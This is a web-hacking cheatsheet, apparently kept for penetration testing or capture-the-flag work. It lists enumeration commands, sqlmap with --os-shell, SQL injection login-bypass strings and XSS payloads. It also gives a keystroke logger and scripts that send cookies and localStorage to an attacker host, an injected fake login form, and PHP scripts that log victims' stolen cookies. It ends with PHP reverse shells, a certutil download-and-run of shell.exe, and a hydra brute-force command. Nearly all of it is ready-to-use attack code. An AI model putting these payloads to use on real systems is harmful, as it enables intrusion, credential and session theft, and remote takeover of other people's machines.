# Web Hacking Cheatsheet

---

<!--
##################################################################
##################################################################
-->

## Enumeration

### Directory Scan Using Gobuster

`gobuster dir -w /usr/share/seclists/Discovery/Web-Content/name of list -u http://targetURL`

---

### cURL

#### Links

[Everything curl](https://everything.curl.dev/)

#### GET Request

`curl http://targetURL`

#### GET Request Save Cookie

`curl -c /tmp/cookies http://targetURL`

#### GET Request with Cookie

`curl -b 'cookiename=cookievalue' https://google.com`

#### POST Request

`curl -X POST --data randomdata http://targetURL`

#### File Upload

`curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`

#### Set content length

`curl -d "" -X POST http://targetsite`

---

### Wfuzz

#### Wfuzz flags

```
Usage:  wfuzz [options] -z payload,params <url>
-c                        : Output with colors
-z payload                : Specify a payload for each FUZZ keyword used in the form of name[,parameter][,encoder].
--hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
```

#### File discovery
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "http://TARGETIP/FUZZ"`

#### Directory discovery
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 301,404,403 "http://TARGETIP/FUZZ"`

#### Fuzzing Parameter discovery
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 301,404, "http://TARGETIP/PARAMETER.php?FUZZ=data"`

#### Fuzzing Parameter values
`wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://TARGETIP/index.php?fpv=FUZZ`

#### Fuzzing POST Data
`wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://TARGETIP/wp-login.php`

---

### Hakrawler

#### Description
```
Hakrawler uses the Wayback Machine by default and accepts URLs as file input, meaning we only need to supply a few parameters. The most commonly-used parameter is -d <number>, in which the number represents the depth Hakrawler should crawl on its targeted domain(s).

Usage of hakrawler:
  -d int
    	Depth to crawl. (default 2)
  -insecure
    	Disable TLS verification.
  -t int
    	Number of threads to utilise. (default 8)
```

#### Crawl
`cat urls.txt | hakrawler`

---

<!--
##################################################################
##################################################################
-->

## OAuth

#### Enumerating Metadata

**Find OAuth Server URL and make requests below**
`GET /.well-known/oauth-authorization-server`
`GET /.well-known/openid-configuration`
**EXAMPLE** `curl https://accounts.google.com/.well-known/openid-configuration`

---

<!--
##################################################################
##################################################################
-->

## SQLI

### Sqlmap

#### Test for SQLI with SQLMAP Using Cookie

`sqlmap -u 'http://website.address?field=to-test' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`

#### Use SQLMAP to Get Shell

`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=802vjt3crnju4eg3ib0q04ge9v" --os-shell`

---

#### Bypass Authentication with SQL Injection

`' or 1=1 --`

`a' or 1=1 --`

`" or 1=1 --`

`a" or 1=1 --`

`' or 1=1 #`

`" or 1=1 #`

`or 1=1 --`

`' or 'x'='x`

`" or "x"="x`

`') or ('x'='x`

`") or ("x"="x`

---

<!--
##################################################################
##################################################################
-->

## XSS

#### XSS Payloads

[Portswigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
[PayloadsAllTheThings XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[Payloadbox xss-payload-list](https://github.com/payloadbox/xss-payload-list)

| Code                                                                                     | Description                   |
| ---------------------------------------------------------------------------------------- | ----------------------------- |
| **Payloads**                                                                             |
| `<script>alert(window.origin)</script>`                                                  | Basic XSS Payload             |
| `<plaintext>`                                                                            | Basic XSS Payload             |
| `<script>print()</script>`                                                               | Basic XSS Payload             |
| `<img src="" onerror=alert(window.origin)>`                                              | HTML-based XSS Payload        |
| `<script>document.body.style.background = "#141d2b"</script>`                            | Change Background Color       |
| `<script>document.body.background = "https://www.test.com/images/logo-htb.svg"</script>` | Change Background Image       |
| `<script>document.title = 'TEST'</script>`                                               | Change Website Title          |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`           | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>`                          | Remove certain HTML element   |
| `<script src="http://OUR_IP/script.js"></script>`                                        | Load remote script            |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`          | Send Cookie details to us     |

---

### [XSStrike](https://github.com/s0md3v/XSStrike)

**Tool for detecting XSS**

#### Run a Scan

`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`

---

### [XSS-Cookie-Stealer](https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py)

**Tool for cookie hijacking**

---

### Where to check in code for XSS

Direct Input

    JavaScript code <script></script>
    CSS Style Code <style></style>
    Tag/Attribute Fields <div name='INPUT'></div>
    HTML Comments <!-- -->

If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, JavaScript functions that allow changing raw text of HTML fields, like:

    DOM.innerHTML
    DOM.outerHTML
    document.write()
    document.writeln()
    document.domain

An the following jQuery functions:

    html()
    parseHTML()
    add()
    append()
    prepend()
    after()
    insertAfter()
    before()
    insertBefore()
    replaceAll()
    replaceWith()

As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.

---

### Reflected XSS Keylogger

```
function logKey(event) {
    fetch("http://192.168.49.188/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
```
---

### Pull Payload from External Resource
`<script src="http://EXTERNALHOST/PAYLOAD">`

---

### Cookie Grabbing JavaScript (**Only works when HTTPOnly Cookie is not present**)

```
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://YOURIP/exfil?data=" + encodedCookie)
```

---

### Exfiltrate Local Storage JavaScript

```
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://YOURIP/exfil?data=" + encodedData)
```

---

<!--
##################################################################
##################################################################
-->

## Credential Phishing

#### Fake Login Element

```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

---

#### Inject fake login element

`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`

---

#### PHP creds capture script redirect

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

---

#### PHP write capture to file

```
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

---

<!--
##################################################################
##################################################################
-->

## [SQLite](https://www.sqlitetutorial.net/sqlite-commands/)

#### Access Database

`sqlite3 databasename.db`

#### Show Tables

`.tables`

#### Show Table Info

`PRAGMA table_info(tablename);`
`.schema tablename`

#### Dump Info From Table

`SELECT * FROM customers;`
`.dump tablename`

---

<!--
##################################################################
##################################################################
-->

## Shells

#### PHP

`php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'`

`php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

---

#### Windows PHP Reverse Shell

`wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`

---

#### Grab and Execute File

```
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.203/shell.exe"', $val);
sleep(5);
$exec = system('shell.exe', $val);
?>
```

---

<!--
##################################################################
##################################################################
-->

## Local File Inclusion

#### Check for if reverse shell possible after =

**Start Netcat Listener**

`nc -nlvp 80`

**Attempt to send request to Netcat listener**

`curl http://targeturl/site/index.php?page=http://NetcatAddress/test`

---

<!--
##################################################################
##################################################################
-->

## Brute Forcing

#### Web Login

`hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`

---

<!--
##################################################################
##################################################################
-->

## Useful Commands
